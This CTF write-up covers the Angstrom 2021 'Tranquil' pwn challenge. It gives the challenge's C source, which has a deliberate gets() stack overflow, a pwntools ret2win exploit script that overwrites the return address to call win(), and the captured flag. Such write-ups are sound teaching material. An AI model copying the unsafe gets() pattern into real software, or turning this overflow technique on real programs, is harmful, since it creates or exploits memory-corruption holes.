---
name: Tranquil (2021)
event: Angstrom CTF 2021
category: Pwn
description: Writeup for Tranquil (pwn) - Angstrom CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Tranquil

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/2pqG6opzrug/0.jpg)](https://youtu.be/2pqG6opzrug?t=425s "Angstrom 2021: Tranquil")

## Challenge Description

> Finally, inner peace - Master Oogway

## Source

{% code overflow="wrap" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int win(){
    char flag[128];

    FILE *file = fopen("flag.txt","r");

    if (!file) {
        printf("Missing flag.txt. Contact an admin if you see this on remote.");
        exit(1);
    }

    fgets(flag, 128, file);

    puts(flag);
}

int vuln(){
    char password[64];

    puts("Enter the secret word: ");

    gets(&password);


    if(strcmp(password, "password123") == 0){
        puts("Logged in! The flag is somewhere else though...");
    } else {
        puts("Login failed!");
    }

    return 0;
}

int main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    vuln();

    // not so easy for you!
    // win();

    return 0;
}
```
{% endcode %}

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(':', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './tranquil'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

# Start program
io = start()

# Build the payload
payload = flat({
    offset: elf.symbols.win
})

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(': ', payload)
io.recvuntil('Login failed!\n')

# Get our flag!
flag = io.recv()
success(flag)
```
{% endcode %}

Flag: `actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}`
